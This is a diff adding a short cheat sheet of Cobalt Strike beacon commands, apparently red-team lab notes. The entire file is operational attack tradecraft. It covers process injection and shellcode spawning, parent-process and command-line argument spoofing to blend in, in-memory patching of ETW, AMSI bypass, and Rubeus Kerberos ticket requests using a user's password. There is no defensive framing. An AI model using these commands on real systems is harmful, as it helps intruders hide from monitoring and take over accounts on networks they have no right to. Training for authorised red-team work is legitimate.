@@ -1,0 +1,47 @@
+
+### CS cheat sheet
+
+```bash copy 
+# Inject opst-ex capability into another process
+beacon> spawnto x64 %windir%\\sysnative\\dllhost.exe
+
+# ProcessID parent spoofing PPID, Can be combined with spawnto to blend in, here we're spoofing the internet explorer as a parent, and we'll spawn the post-ex cap into another iexplorer so that It looks like just another tab under the browser process
+beacon> ppid 
+beacon> spawnto x64 c:\Program Files\Internet Explorer\iexplorer.exe
+
+
+# Command line argument spoofing, use any fake arguments after argue powershell and It'll be spoofed in any powershell command we run next
+beacon> argue powershell -c "Invoke-WebRequest -Uri 'https://catfact.ninja/fact' -UseBasicParsing | Select-Object -ExpandProperty 'Content' | ConvertFrom-Json | Select-Object -ExpandProperty fact" 
+beacon> powershell any_command 
+
+# Bypass network traffic analysis by injecting into processes that are expected to send the same kind of traffic that we're sending, for ex: 
+beacon> spawnto x64 %windir%\sysnative\gpresult.exe
+beacon> execute-assembly C:\Tools\ADSearch\ADSearch\bin\Release\ADSearch.exe --computers
+beacon> execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe asktgt /user:bturner /password:xJ*G
+
+# Bypass Image load events to run powershell commands
+beacon> spawnto x64 %windir%\sysnative\msiexec.exe
+
+# Bypass ETW by patching it in memory, powerpick also supports this in-memory patching technique
+beacon> execute-assembly "PATCHES: ntdll.dll,EtwEventWrite,0,C3 ntdll.dll,EtwEventWrite,1,00" C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe
+# We can make an alias in the profile for this  long command -- look profile config
+execute-assembly-patched C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe
+
+# Execute post-ex BOFs within the beacon process, first we have to load the CNA of C:\Tools\InlineExecute-Assembly
+# change app-domain and pipename to  any other values
+beacon> inlineExecute-Assembly --dotnetassembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe --assemblyargs klist --amsi --etw --appdomain SharedDomain --pipe dotnet-diagnostic-1337
+
+# Injecting another beacon into a remote process
+beacon> inject 5465 x64
+
+# Injecting a post-ex cap into a remote process
+beacon> shinject 7696 x64 C:\payloads\payload.bin
+
+# Spawn a new process and injecting the post-ex cap payload into it
+# This is more stable and we're not afraid of crashing a real running process causing any harm.
+beacon> shspawn x64 C:\Users\VM_Windows\Documents\payload.bin
+
+## Living without process injection
+# Run a command under a parent in another desktop session.
+beacon> runu 4654 notepad
+```
